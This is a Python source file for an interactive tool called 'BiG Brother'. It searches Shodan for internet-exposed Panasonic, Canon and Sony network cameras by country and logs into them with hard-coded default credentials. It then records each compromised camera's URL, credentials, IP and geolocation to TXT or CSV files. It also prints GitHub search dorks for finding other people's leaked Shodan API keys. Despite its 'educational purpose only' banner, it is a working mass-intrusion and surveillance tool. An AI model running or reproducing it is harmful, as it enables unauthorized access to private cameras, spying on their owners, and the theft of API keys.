# -*- coding: utf-8 -*-

# Author:   Naqwada (RuptureFarm 1029) <naqwada@protonmail.com>
# License:  MIT License (http://www.opensource.org/licenses/mit-license.php)
# Docs:     https://github.com/Naqwa/BiG-Brother
# Website:  http://samy.link/
# Linkedin: https://www.linkedin.com/in/samy-younsi/
# Note:     FOR EDUCATIONAL PURPOSE ONLY.

from __future__ import print_function, unicode_literals
from PyInquirer import Separator, Token, prompt, style_from_dict
from termcolor import cprint
import requests
import shodan
import base64
import random
import time
import csv
import os

def banner():
  bigBrother = """
               ___
 █▄▄ █ █▀▀   [|   |=|{)__
 █▄█ █ █▄█    |___| \/   )
               /|\      /|
              / | \     | \\
 █▄▄ █▀█ █▀█ ▀█▀ █░█ █▀▀ █▀█
 █▄█ █▀▄ █▄█ ░█░ █▀█ ██▄ █▀▄
 Author: Naqwada
 RuptureFarm 1029      

    FOR EDUCATIONAL PURPOSE ONLY.   
  """
  txtColors = ['red', 'green', 'cyan', 'yellow', 'blue', 'magenta']
  return cprint(bigBrother, random.choice(txtColors), attrs=['bold'])

def getSavedAPIKey():
  filename = 'shodan_key.txt'
  file_exists = os.path.isfile(filename) 
  if file_exists:
    return open(filename, 'r').read()
  else:
    return open(filename, 'w+').read()

def checkShodanAPIKey(apiKey):
  try:
    print('[⏳] Checking if the Shodan API key is valid...')
    api = shodan.Shodan(apiKey)
    api.search('0_0')
    cprint('[✔️] API Key Authentication: SUCCESS..!', 'green', attrs=['bold'])
    saveAPIKey(apiKey)
    cprint('[📑] The API Key has been saved.\n', 'blue', attrs=['bold'])
    return apiKey
  except shodan.APIError as errorMessage:
    cprint('[🚫] Error: {}. Please, try again.'.format(errorMessage), 'red', attrs=['bold'])
    exit()

def findShoddanAPIKeyOnGit(boolean):
  if boolean == True:
    cprint('[👻] Here is a list of GitHub dorks to help you find a Shodan API Key', 'green', attrs=['bold'])
    print('[+] \033[1;32m Dork 1:\033[1;m shodan_api_key language:python')
    print('[+] \033[1;32m Dork 2:\033[1;m shodan_api_key language:php')
    print('[+] \033[1;32m Dork 3:\033[1;m shodan_api_key language:javascript')
    print('[+] \033[1;32m Dork 4:\033[1;m shodan_key language:python')
    print('[+] \033[1;32m Dork 5:\033[1;m shodan_key language:php')
    print('[+] \033[1;32m Dork 6:\033[1;m shodan_key language:javascript')
    cprint('[👀] Insert the following dorks in the GitHub search bar, select the "Code" tab, and look carefully for Shodan API keys in the code.', 'green', attrs=['bold'])
    cprint('[✏️] You can also modify the dorks by changing the language for example to get more results.', 'green', attrs=['bold'])
  print('\n[👹] See you soon for a new adventure!\n')  
  exit()

def shodanSearch(apiKey, params):
  try:    
    api = shodan.Shodan(apiKey)
    query = getCameraDork(params['keywords'])

    if params['country'] != 'all':
      query = '{} country:"{}"'.format(query, params['country'])

    cprint('[/] The research of cameras has begun. It may take a while, please be patient.\n', 'yellow', attrs=['bold'])
    results = []
    counter = 1
    nbCameraTested = 1
    for response in api.search_cursor(query):
      cameraName = detectCameraType(response['http']['title'])
      if cameraName != False:
        cameraData = globals()[cameraName+'Curl'](response)
        if cameraData != False:
          cameraData['cameraName'] = cameraName
          print('[+] \033[1;32m URL:\033[1;m {}'.format((cameraData['url'])))
          print('[+] \033[1;32m Credentials:\033[1;m {}'.format((cameraData['credentials'])))
          print('[+] \033[1;32m IP:\033[1;m {}'.format((cameraData['ip_str'])))
          print('[+] \033[1;32m Port:\033[1;m {}'.format(str(cameraData['port'])))
          print('[+] \033[1;32m Camera type:\033[1;m {} | {}'.format(cameraData['cameraName'], str(cameraData['http']['title'])))
          print('[+] \033[1;32m Latitude:\033[1;m {}'.format(str(cameraData['location']['latitude'])))
          print('[+] \033[1;32m Longitude:\033[1;m {}'.format(str(cameraData['location']['longitude'])))
          print('[+] \033[1;32m City:\033[1;m {}'.format(str(cameraData['location']['city'])))
          print('[+] \033[1;32m Country:\033[1;m {}'.format(str(cameraData['location']['country_name'])))

          print('\n[👾] \033[1;32m Result:\033[1;m {}. \033[1;32m Search query:\033[1;m {}'.format(str(counter), str(query)))
          results.append(cameraData) 
          print('\n')
          counter += 1

      nbCameraTested +=1    
      if(nbCameraTested % 15 == 0):
        cprint('[/] Total cameras tested: {}\n'.format(nbCameraTested), 'yellow', attrs=['bold'])

      time.sleep(0.5)
      if counter >= 999:
        break
    return results
  except shodan.APIError as errorMessage:
    cprint('[🚫] Error: {}. Please, try again.'.format(errorMessage), 'red', attrs=['bold'])


def detectCameraType(title):
  # First we check if it's a Panasonic camera
  # Ex: WV-SW316...
  title = title.lower()
  if title[2] == '-':
    return 'panasonic'
  elif title.find('network camera vb-') == True:
    return 'canon'
  elif title == 'sony network camera':
    return 'sony'
  else:
    return False

def getCameraDork(name):
  name = name.lower()
  if name == 'panasonic':
    return 'title:"network camera"'
  elif name == 'canon':
    return 'title:"network camera vb-"'
  elif name == 'sony':
    return 'title:"sony network camera"'
  else:
    return 'title:"camera"'

def panasonicCurl(data):
  data['credentials'] = 'admin:12345'
  data['url'] = 'http://{}:{}/admin/index.html'.format(data['ip_str'], data['port'])

  headers = {
    'User-Agent': 'BiGBrother/1.0.2',
    'Authorization': 'Basic {}'.format(str(base64.b64encode(data['credentials'].encode('utf-8')), 'utf-8')),
    'Upgrade-Insecure-Requests': '1',
  }

  response = execCurl(data['url'], headers)
  if response == False:
    return response
  
  return data

def canonCurl(data):
  data['credentials'] = 'root:camera'
  data['url'] = 'http://{}:{}/live/index.html'.format(data['ip_str'], data['port'])

  headers = {
    'User-Agent': 'BiGBrother/1.0.2',
    'Authorization': 'Basic {}'.format(str(base64.b64encode(data['credentials'].encode('utf-8')), 'utf-8')),
    'Upgrade-Insecure-Requests': '1',
  }
  params = (
      ('Language', '1'),
      ('ViewMode', 'pull'),
  )
  response = execCurl(data['url'], headers, params)
  if response == False:
    return response

  return data
  
def sonyCurl(data):
  data['credentials'] = 'admin:admin'
  data['url'] = 'http://{}:{}/command/inquiry.cgi?inq=user'.format(data['ip_str'], data['port'])

  headers = {
    'User-Agent': 'BiGBrother/1.0.2',
    'Authorization': 'Basic {}'.format(str(base64.b64encode(data['credentials'].encode('utf-8')), 'utf-8')),
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'keep-alive'
  }

  response = execCurl(data['url'], headers)
  if response == False:
    return response

  return data

def execCurl(url, headers, params=None):
  try:
    response = requests.get(url, headers=headers, params=params, verify=False)
    if response.status_code == 200:
      return True
    else:
      return False
  except requests.exceptions.HTTPError as errh:
      return False
  except requests.exceptions.ConnectionError as errc:
      return False
  except requests.exceptions.Timeout as errt:
      return False
  except requests.exceptions.RequestException as err:
      return False
  except KeyboardInterrupt:
      print('\n[👹] See you soon for a new adventure!\n')
      exit()

def saveResultsAs(questName, fileFormat, results):
  savePath = 'quests/'
  filename = '{}-{}.{}'.format(str(questName), time.strftime('%Y-%m-%d-%H:%M'), fileFormat)
  fullPath = os.path.join(savePath, filename) 
  counter = 1
  if fileFormat == 'csv':
    csvColumns = ['#', 'URL', 'Credentials', 'IP', 'Port', 'Camera type', 'Latitude', 'Longitude', 'City', 'Country']
    try:
      with open(fullPath, 'w+') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=csvColumns)
        writer.writeheader()
        for result in results:
          writer.writerow({'#': counter, 'URL': result['url'], 'Credentials': result['credentials'], 'IP': result['ip_str'], 'Port': result['port'], 'Camera type': result['cameraName'], 'Latitude': result['location']['latitude'], 'Longitude': result['location']['longitude'], 'City': result['location']['city'], 'Country': result['location']['country_name']})
          counter += 1
    except IOError:
      print(IOError)
  else:
    try:
      file = open(fullPath, 'w+')
      counter = counter + 1
      for result in results:
        file.write('[+] URL: {}'.format((result['url'])))
        file.write('[+] Credentials: {}'.format((result['credentials'])))
        file.write('[+] IP: {}'.format((result['ip_str'])))
        file.write('[+] Port: {}'.format(str(result['port'])))
        file.write('[+] Camera Type: {}'.format(result['cameraName']))
        file.write('[+] Latitude: {}'.format(str(result['location']['latitude'])))
        file.write('[+] Longitude: {}'.format(str(result['location']['longitude'])))
        file.write('[+] City: {}'.format(str(result['location']['city'])))
        file.write('[+] Country: {}'.format(str(result['location']['country_name'])))
        file.write('\n[✓] Result: {}. Search query: {}\n'.format(str(counter), str(questName)))
        counter += 1
    except IOError:
      print("I/O error")
  return filename

def saveAPIKey(apiKey):
  filename = 'shodan_key.txt'
  file_exists = os.path.isfile(filename) 
  if file_exists:
    file = open(filename, 'w')
    file.write(apiKey) 
    file.close()
  else:
    file = open(filename, 'w+')
    file.write(apiKey) 
    file.close()
  return True

def main():
  banner()

  shodanAPIKey = getSavedAPIKey()
  results = ''
  
  if len(shodanAPIKey) == 0: 
    print('[🙂] Hi, welcome to Big Brother!\n')
  else:
    print('[🤠]  Welcome back, ready to spy?!\n')

  answers = prompt(initQuestions, style=promptStyle)

  if answers.get('findNewKey') == False or answers.get('findNewKey') == True:
    findShoddanAPIKeyOnGit(answers.get('findNewKey'))

  if len(answers) and answers.get('usePreviousKey') == True: 
    shodanAPIKey = checkShodanAPIKey(shodanAPIKey)
  
  if len(answers) and answers.get('haveOwnKey') == True:
    shodanAPIKey = checkShodanAPIKey(answers.get('useNewKey'))

  if len(answers) > 0:   
    answers = prompt(searchQuestions, style=promptStyle)

  if len(answers):
    if len(answers['keywords']) > 0:
      questName = answers['keywords']
      results = shodanSearch(shodanAPIKey, answers)
  else:
    print('\n[👹] See you soon for a new adventure!\n')
    exit()

  if results:
    answers = prompt(saveResultsQuestion, style=promptStyle) 
    if answers.get('fileFormat'):
      file = saveResultsAs(questName, answers.get('fileFormat'), results)
      if len(file) > 0:
        print('[📝] Your file {} has been successfully saved!\n'.format(file))
  else:
    cprint('[😓] No result found. Please try again using another keywords or dorks combo.', 'yellow', attrs=['bold']) 



  print('\n[👹] See you soon for a new adventure!\n')

initQuestions = [
    {
        'type': 'confirm',
        'name': 'usePreviousKey',
        'qmark': '[❓]',
        'message': 'Saved Shodan API key detected, do you want to use the following key: {} for your current quest?'.format(getSavedAPIKey()),
        'default': True,
        'when': lambda answer: 'The length of the API key should be at least 30 characters.' \
            if len(getSavedAPIKey()) > 30 else False
    },
   {
        'type': 'confirm',
        'name': 'haveOwnKey',
        'qmark': '[❓]',
        'message': 'Do you have a Shodan API key?',
        'default': True,
        'when': lambda answers: answers.get('usePreviousKey') == False or len(getSavedAPIKey()) < 30,
    },
    {
        'type': 'password',
        'name': 'useNewKey',
        'message': 'Enter your Shodan API key:',
        'qmark': '[🔑]',
        'when': lambda answers: answers.get('haveOwnKey') == True,
        'validate': lambda answer: 'The length of the API key should be at least 30 characters.' \
            if len(answer) < 30 else True
    },
    {
        'type': 'confirm',
        'name': 'findNewKey',
        'qmark': '[❓]',
        'message': 'You can try to find a valid API key for free using GitHub dork. Are you interested?',
        'default': False,
        'when': lambda answers: answers.get('haveOwnKey') == False,
    }
]

searchQuestions = [
    {
        'type': 'list',
        'qmark': '[🤖]',
        'message': 'What type of camera are you looking for?',
        'name': 'keywords',
        'choices': [ 
            {
                'name': 'All'
            },
            # {
            #     'name': 'Alphafinity'
            # },
            {
                'name': 'Canon'
            },
            # {
            #     'name': 'INSTAR'
            # },
            # {
            #     'name': 'Milesight'
            # },
            {
                'name': 'Panasonic'
            },
            {
                'name': 'Sony'
            },
            # {
            #     'name': 'Vacron'
            # },
            # {
            #     'name': 'VideoIQ'
            # }
          ],
          'filter': lambda val: val.lower(),
          'validate': lambda answer: 'You must choose at least one brand.' \
            if len(answer) == 0 else True
    },
      {
        'type': 'list',
        'qmark': '[🏳️]',
        'message': 'In which country do you want to focus your research?',
        'name': 'country',
        'choices': [
            { 
               'name': 'All'
            },
            { 
               'name': 'JP'
            },
            { 
               'name': 'DE'
            },
            { 
               'name': 'US'
            },
            { 
               'name': 'TH'
            },
            { 
               'name': 'KR'
            },
            { 
               'name': 'VN'
            },
            { 
               'name': 'IT'
            },
            { 
               'name': 'NL'
            },
            { 
               'name': 'FR'
            },
            { 
               'name': 'AT'
            },
            { 
               'name': 'TW'
            },
            { 
               'name': 'ES'
            },
            { 
               'name': 'RU'
            },
            { 
               'name': 'HK'
            },
            { 
               'name': 'GB'
            },
            { 
               'name': 'BE'
            },
            { 
               'name': 'SG'
            },
            { 
               'name': 'PL'
            },
            { 
               'name': 'CA'
            },
            { 
               'name': 'AU'
            },
            { 
               'name': 'CZ'
            },
            { 
               'name': 'TR'
            },
            { 
               'name': 'CH'
            },
            { 
               'name': 'IN'
            },
            { 
               'name': 'BR'
            },
            { 
               'name': 'SE'
            },
            { 
               'name': 'FI'
            },
            { 
               'name': 'DK'
            },
            { 
               'name': 'HU'
            },
            { 
               'name': 'NO'
            },
            { 
               'name': 'PA'
            },
            { 
               'name': 'RO'
            },
            { 
               'name': 'GR'
            },
            { 
               'name': 'BG'
            },
            { 
               'name': 'CN'
            },
            { 
               'name': 'ID'
            },
            { 
               'name': 'MX'
            },
            { 
               'name': 'UA'
            },
            { 
               'name': 'MY'
            },
            { 
               'name': 'ZA'
            },
            { 
               'name': 'SK'
            },
            { 
               'name': 'PT'
            },
            { 
               'name': 'IE'
            },
            { 
               'name': 'IR'
            },
            { 
               'name': 'IL'
            },
            { 
               'name': 'HR'
            },
            { 
               'name': 'AR'
            },
            { 
               'name': 'NZ'
            },
            { 
               'name': 'EG'
            },
            { 
               'name': 'UY'
            },
            { 
               'name': 'SI'
            },
            { 
               'name': 'TN'
            },
            { 
               'name': 'EE'
            },
            { 
               'name': 'SV'
            },
            { 
               'name': 'LT'
            },
            { 
               'name': 'IS'
            },
            { 
               'name': 'RS'
            },
            { 
               'name': 'LU'
            },
            { 
               'name': 'LV'
            },
            { 
               'name': 'CL'
            },
            { 
               'name': 'SA'
            },
            { 
               'name': 'CO'
            },
            { 
               'name': 'DZ'
            },
            { 
               'name': 'MA'
            },
            { 
               'name': 'VE'
            },
            { 
               'name': 'AE'
            },
            { 
               'name': 'BY'
            },
            { 
               'name': 'CR'
            },
            { 
               'name': 'MD'
            },
            { 
               'name': 'MO'
            },
            { 
               'name': 'EC'
            },
            { 
               'name': 'KW'
            },
            { 
               'name': 'MK'
            },
            { 
               'name': 'PH'
            },
            { 
               'name': 'PK'
            },
            { 
               'name': 'BD'
            },
            { 
               'name': 'PR'
            },
            { 
               'name': 'JE'
            },
            { 
               'name': 'KZ'
            },
            { 
               'name': 'IM'
            },
            { 
               'name': 'MT'
            },
            { 
               'name': 'NI'
            },
            { 
               'name': 'AL'
            },
            { 
               'name': 'BA'
            },
            { 
               'name': 'CW'
            },
            { 
               'name': 'CY'
            },
            { 
               'name': 'GA'
            },
            { 
               'name': 'HN'
            },
            { 
               'name': 'JO'
            },
            { 
               'name': 'MC'
            },
            { 
               'name': 'GU'
            },
            { 
               'name': 'KH'
            },
            { 
               'name': 'MU'
            },
            { 
               'name': 'PY'
            },
            { 
               'name': 'DO'
            },
            { 
               'name': 'LA'
            },
            { 
               'name': 'PE'
            },
            { 
               'name': 'RE'
            },
            { 
               'name': 'GE'
            },
            { 
               'name': 'GH'
            },
            { 
               'name': 'GP'
            },
            { 
               'name': 'IQ'
            },
            { 
               'name': 'JM'
            },
            { 
               'name': 'OM'
            },
            { 
               'name': 'AG'
            },
            { 
               'name': 'AX'
            },
            { 
               'name': 'BH'
            },
            { 
               'name': 'BZ'
            },
            { 
               'name': 'GG'
            },
            { 
               'name': 'GI'
            },
            { 
               'name': 'LB'
            },
            { 
               'name': 'LI'
            },
            { 
               'name': 'NC'
            },
            { 
               'name': 'AD'
            },
            { 
               'name': 'AI'
            },
            { 
               'name': 'AW'
            },
            { 
               'name': 'BT'
            },
            { 
               'name': 'FO'
            },
            { 
               'name': 'GF'
            },
            { 
               'name': 'GT'
            },
            { 
               'name': 'HT'
            },
            { 
               'name': 'KG'
            },
            { 
               'name': 'KN'
            },
            { 
               'name': 'KY'
            },
            { 
               'name': 'ME'
            },
            { 
               'name': 'MG'
            },
            { 
               'name': 'MQ'
            },
            { 
               'name': 'MZ'
            },
            { 
               'name': 'NG'
            },
            { 
               'name': 'PF'
            },
            { 
               'name': 'QA'
            },
            { 
               'name': 'SX'
            },
            { 
               'name': 'SY'
            },
            { 
               'name': 'TT'
            },
            { 
               'name': 'TZ'
            },
            { 
               'name': 'UZ'
            },
            { 
               'name': 'XK'
            },
            { 
               'name': 'ZM'
            }
          ],
          'filter': lambda val: val.lower(),
          'validate': lambda answer: 'You must choose at least one country.' \
            if len(answer) == 0 else True
    }
]

saveResultsQuestion = [
    {
        'type': 'confirm',
        'name': 'wantSaveResults',
        'qmark': '[❓]',
        'message': 'Do you want to save the result of your quest?',
        'default': True,
    },    
    {
        'type': 'list',
        'name': 'fileFormat',
        'qmark': '[❓]',
        'message': 'What type of format do you need?',
        'choices': ['TXT', 'CSV'],
        'filter': lambda val: val.lower(),
        'when': lambda answers: answers.get('wantSaveResults') == True,
    }
]

promptStyle = style_from_dict({
    Token.Separator: '#b41e44 bold',
    Token.QuestionMark: '#4b7bec',
    Token.Selected: '#b41e44 bold',
    Token.Pointer: '#45aaf2 bold',
    Token.Instruction: '', 
    Token.Answer: '#fff bold',
    Token.Question: '#3498db bold',
})

if __name__ == "__main__":
  main()